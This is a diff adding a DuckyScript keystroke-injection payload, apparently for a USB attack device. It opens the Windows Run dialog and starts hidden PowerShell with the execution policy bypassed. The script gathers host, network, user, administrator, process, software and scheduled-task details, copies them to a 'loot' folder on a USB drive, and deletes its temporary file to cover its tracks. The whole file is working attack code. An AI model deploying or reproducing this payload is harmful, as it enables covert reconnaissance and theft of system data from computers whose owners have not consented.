@@ -1,0 +1,12 @@
+REM ================================================
+REM  FLLC — System Information Dump
+REM  Collects hostname, IP, users, installed software,
+REM  running processes, and network config to USB.
+REM  Target: Windows 10/11 | Time: ~12 seconds
+REM ================================================
+
+DELAY 800
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -ep bypass -c "$h=hostname;$ts=Get-Date -f 'yyyyMMdd_HHmmss';$f=\"$env:TEMP\fllc_$($h)_$ts.txt\";$r=@();$r+='='*60;$r+='  FLLC SYSTEM DUMP';$r+=\"  Host: $h | $(Get-Date)\";$r+='='*60;$r+='';$r+='--- SYSTEM INFO ---';$r+=systeminfo 2>&1|Out-String;$r+='--- NETWORK CONFIG ---';$r+=ipconfig /all 2>&1|Out-String;$r+='--- ARP TABLE ---';$r+=arp -a 2>&1|Out-String;$r+='--- ROUTES ---';$r+=route print 2>&1|Out-String;$r+='--- USERS ---';$r+=net user 2>&1|Out-String;$r+='--- LOCAL ADMINS ---';$r+=net localgroup administrators 2>&1|Out-String;$r+='--- RUNNING PROCESSES ---';$r+=Get-Process|Select Name,Id,CPU,WS|Out-String;$r+='--- INSTALLED SOFTWARE ---';$r+=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Select DisplayName,DisplayVersion,Publisher|Out-String;$r+='--- SCHEDULED TASKS ---';$r+=schtasks /query /fo LIST 2>&1|Out-String;$r|Out-File $f -Encoding UTF8;$usb=(Get-WmiObject Win32_LogicalDisk|?{$_.DriveType -eq 2}|Select -First 1).DeviceID;if($usb){$ld=\"$usb\loot\";New-Item -ItemType Directory -Path $ld -Force|Out-Null;Copy-Item $f \"$ld\sysinfo_$($h)_$ts.txt\" -Force};Remove-Item $f -Force"
+ENTER
